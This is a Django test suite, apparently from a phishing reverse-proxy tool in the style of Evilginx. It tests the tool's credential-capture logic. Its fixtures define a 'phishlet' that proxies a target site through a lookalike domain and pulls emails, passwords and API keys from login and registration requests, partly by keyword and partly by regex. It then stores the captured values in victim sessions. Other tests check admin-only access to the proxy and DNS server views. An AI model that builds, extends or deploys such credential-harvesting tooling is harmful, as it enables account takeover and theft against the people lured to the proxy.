from django.test import TestCase
from django.utils import timezone
from unittest.mock import Mock, patch, AsyncMock
import json
import re

from .models import Phishlet, Session


class CredentialCaptureTestCase(TestCase):
    """Test cases for credential capture functionality"""
    
    def setUp(self):
        """Set up test data"""
        # Create a test phishlet with credential configuration
        self.phishlet_data = {
            "name": "test.com",
            "target_url": "https://test.com",
            "proxy_domain": "test.in",
            "hosts_to_proxy": [
                {
                    "host": "test.com",
                    "proxy_subdomain": "",
                    "autocert": True
                }
            ],
            "auth_urls": [
                "/login",
                "/register",
                "/api/auth"
            ],
            "credentials": [
                {
                    "type": "post",
                    "name": "username",
                    "keyword": "email",
                    "regexp": "false"
                },
                {
                    "type": "post",
                    "name": "password",
                    "keyword": "password",
                    "regexp": "false"
                },
                {
                    "type": "json",
                    "name": "api_key",
                    "keyword": "api_key",
                    "regexp": "true",
                    "regexp_string": "api_key\":\\s*\"([^\"]*)\""
                }
            ]
        }
        
        self.phishlet = Phishlet.objects.create(
            name="test-phishlet",
            data=self.phishlet_data,
            is_active=True
        )
        
        # Create a test session
        self.session = Session.objects.create(
            session_cookie="test_session_123",
            phishlet=self.phishlet,
            proxy_domain="test.in",
            visitor_ip="127.0.0.1",
            user_agent="Test User Agent"
        )
    
    def test_phishlet_credential_config(self):
        """Test that phishlet credential configuration is properly structured"""
        data = self.phishlet.data
        
        self.assertIn('auth_urls', data)
        self.assertIn('credentials', data)
        self.assertEqual(len(data['auth_urls']), 3)
        self.assertEqual(len(data['credentials']), 3)
        
        # Check credential types
        cred_types = [cred['type'] for cred in data['credentials']]
        self.assertIn('post', cred_types)
        self.assertIn('json', cred_types)
        
        # Check regex configuration
        regex_creds = [cred for cred in data['credentials'] if cred.get('regexp') == 'true']
        self.assertEqual(len(regex_creds), 1)
        self.assertEqual(regex_creds[0]['name'], 'api_key')
    
    def test_auth_url_matching(self):
        """Test auth URL matching logic"""
        from .http_server import capture_form_data
        
        # Mock request object
        mock_request = Mock()
        mock_request.method = 'POST'
        mock_request.rel_url = '/login'
        
        # Test exact match
        self.assertTrue(any('/login' == auth_url for auth_url in self.phishlet_data['auth_urls']))
        
        # Test prefix match
        self.assertTrue(any(auth_url.startswith('/') and '/login/submit'.startswith(auth_url) 
                          for auth_url in self.phishlet_data['auth_urls']))
        
        # Test non-auth URL
        self.assertFalse(any('/dashboard' == auth_url for auth_url in self.phishlet_data['auth_urls']))
    
    def test_credential_extraction_keyword(self):
        """Test credential extraction using keyword matching"""
        # Test POST form data extraction
        post_data = {
            'email': 'test@example.com',
            'password': 'secret123',
            'other_field': 'ignored'
        }
        
        # Simulate credential extraction logic
        captured_data = {}
        
        for cred_config in self.phishlet_data['credentials']:
            if cred_config['type'] == 'post' and cred_config['keyword'] in post_data:
                value = post_data[cred_config['keyword']]
                cred_name = cred_config['name']
                
                if cred_name.lower() in ['username', 'user', 'email', 'login']:
                    captured_data['captured_username'] = value
                elif cred_name.lower() in ['password', 'pass', 'pwd']:
                    captured_data['captured_password'] = value
        
        self.assertEqual(captured_data['captured_username'], 'test@example.com')
        self.assertEqual(captured_data['captured_password'], 'secret123')
    
    def test_credential_extraction_regex(self):
        """Test credential extraction using regex matching"""
        # Test JSON data extraction with regex
        json_data = {
            "user": "testuser",
            "api_key": "abc123def456",
            "timestamp": "2024-01-01"
        }
        
        json_str = json.dumps(json_data)
        
        # Find the regex credential config
        regex_cred = next(cred for cred in self.phishlet_data['credentials'] 
                         if cred.get('regexp') == 'true')
        
        regex_string = regex_cred['regexp_string']
        match = re.search(regex_string, json_str)
        
        self.assertIsNotNone(match)
        self.assertEqual(match.group(1), 'abc123def456')
    
    def test_session_credential_storage(self):
        """Test that captured credentials are properly stored in session"""
        # Update session with captured credentials
        self.session.update_captured_data(
            captured_username='test@example.com',
            captured_password='secret123'
        )
        
        # Refresh from database
        self.session.refresh_from_db()
        
        self.assertEqual(self.session.captured_username, 'test@example.com')
        self.assertEqual(self.session.captured_password, 'secret123')
        self.assertTrue(self.session.is_captured)
        self.assertTrue(self.session.has_captured_data())
    
    def test_custom_data_storage(self):
        """Test storage of custom captured data"""
        # Add custom data
        self.session.add_custom_data('api_key', 'abc123')
        self.session.add_custom_data('user_id', '12345')
        
        # Refresh from database
        self.session.refresh_from_db()
        
        self.assertIn('api_key', self.session.captured_custom)
        self.assertIn('user_id', self.session.captured_custom)
        self.assertEqual(self.session.captured_custom['api_key'], 'abc123')
        self.assertEqual(self.session.captured_custom['user_id'], '12345')
    
    def test_credential_capture_edge_cases(self):
        """Test edge cases in credential capture"""
        # Test with empty credentials config
        empty_phishlet_data = {
            "name": "empty.com",
            "auth_urls": [],
            "credentials": []
        }
        
        self.assertEqual(len(empty_phishlet_data['auth_urls']), 0)
        self.assertEqual(len(empty_phishlet_data['credentials']), 0)
        
        # Test with missing fields
        incomplete_cred = {
            "type": "post",
            "name": "username"
            # Missing keyword and regexp
        }
        
        self.assertNotIn('keyword', incomplete_cred)
        self.assertNotIn('regexp', incomplete_cred)
    
    def test_phishlet_validation(self):
        """Test phishlet data validation"""
        # Test with valid data
        self.assertTrue(isinstance(self.phishlet.data, dict))
        self.assertIn('auth_urls', self.phishlet.data)
        self.assertIn('credentials', self.phishlet.data)
        
        # Test with invalid data (should handle gracefully)
        invalid_data = "not a dict"
        self.assertFalse(isinstance(invalid_data, dict))


# Create your tests here.


class ServersViewTestCase(TestCase):
    """Test cases for the new combined servers view"""
    
    def setUp(self):
        """Set up test data"""
        from django.contrib.auth.models import User
        # Create a superuser for testing
        self.user = User.objects.create_superuser(
            username='admin',
            email='admin@test.com',
            password='testpass123'
        )
    
    def test_servers_view_requires_authentication(self):
        """Test that servers view requires authentication"""
        from django.urls import reverse
        from django.test import Client
        
        client = Client()
        response = client.get(reverse('servers'))
        
        # Should redirect to login
        self.assertEqual(response.status_code, 302)
        self.assertIn('/login/', response.url)
    
    def test_servers_view_requires_admin(self):
        """Test that servers view requires admin privileges"""
        from django.urls import reverse
        from django.test import Client
        from django.contrib.auth.models import User
        
        # Create a regular user (not admin)
        regular_user = User.objects.create_user(
            username='regular',
            email='regular@test.com',
            password='testpass123'
        )
        
        client = Client()
        client.login(username='regular', password='testpass123')
        response = client.get(reverse('servers'))
        
        # Should redirect to login (admin check fails)
        self.assertEqual(response.status_code, 302)
        self.assertIn('/login/', response.url)
    
    def test_servers_view_accessible_to_admin(self):
        """Test that servers view is accessible to admin users"""
        from django.urls import reverse
        from django.test import Client
        
        client = Client()
        client.login(username='admin', password='testpass123')
        response = client.get(reverse('servers'))
        
        # Should be accessible
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'Servers')
        self.assertContains(response, 'Proxy Server')
        self.assertContains(response, 'DNS Server')
    
    def test_servers_view_template_used(self):
        """Test that servers view uses the correct template"""
        from django.urls import reverse
        from django.test import Client
        
        client = Client()
        client.login(username='admin', password='testpass123')
        response = client.get(reverse('servers'))
        
        # Should use servers.html template
        self.assertTemplateUsed(response, 'servers.html')
